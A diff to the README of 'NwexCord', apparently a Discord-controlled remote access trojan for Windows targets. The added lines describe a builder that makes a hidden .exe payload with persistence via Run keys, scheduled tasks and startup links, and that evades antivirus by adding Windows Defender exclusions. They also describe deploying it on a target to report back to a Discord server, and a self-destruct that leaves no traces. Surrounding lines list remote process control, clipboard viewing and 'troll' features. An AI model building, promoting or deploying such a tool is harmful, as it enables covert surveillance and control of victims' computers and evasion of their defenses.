@@ -16,7 +16,7 @@ Manage the client system with professional-grade utilities:
 - **Active Windows Manager**: List all visible windows and close them remotely.
 - **TCP Connections Manager**: Monitor active network ports and kill associated PIDs.
 - **Process & Service Manager**: Real-time listing with restart, suspend, and terminate controls.
-- **Startup Manager**: Manage items in Startup folders, Registry Run keys, and Scheduled Tasks.
+- **Startup Manager**: Manage items in Startup folders, Registry Run keys, and Scheduled Tasks (fully paginated).
 - **Installed Programs**: Browse and uninstall software packages.
 - **Clipboard & Services**: View clipboard history and manage system services.
 
@@ -52,10 +52,21 @@ Interactive "troll" features and communication tools:
 
 ---
 
-## Getting Started
+## 🛠️ Exe Builder (`builder.py`)
+Compile NwexCord into a standalone, hidden `.exe` payload with a custom, modern UI:
+- **Activity-Based UI**: Sleek dual-screen interface (Main & Settings) with custom Nwexy icon.
+- **Persistence Options**: Inject Startup folder links, Registry Run keys, and Schtasks.
+- **Dynamic Install Paths**: Choose from `%AppData%`, `%ProgramData%`, etc., and optionally nest inside a custom **Subdirectory**.
+- **Security Evasion**: Automatically appends the drop location to Windows Defender Exclusions (WDEX).
+
+---
+
+## 🚀 Getting Started
 1. Run `start.bat` in the root folder.
-2. If this is your first time, the launcher will prompt you for your **Discord Bot Token** (securely saved in `config.py`).
-3. The bot will automatically notify you in Discord with a full system report once it's active.
+2. Choose your run mode via the interactive menu: **Run Locally** or **Build EXE**.
+3. If building, the modern GUI allows you to securely inject your Discord Bot Token, set the icon, and configure persistence.
+4. Once deployed on the target system, the bot will automatically notify your Discord server with a full system report.
+5. **Self-Destruct Mechanisms**: Click the red `Uninstall` button on the bot's main startup view to wipe all registry keys, scheduled tasks, startup folder links, WD exclusions, and fully delete the core executable from the disk, leaving no traces behind.
 
 ## Requirements
 - Windows OS (Target)
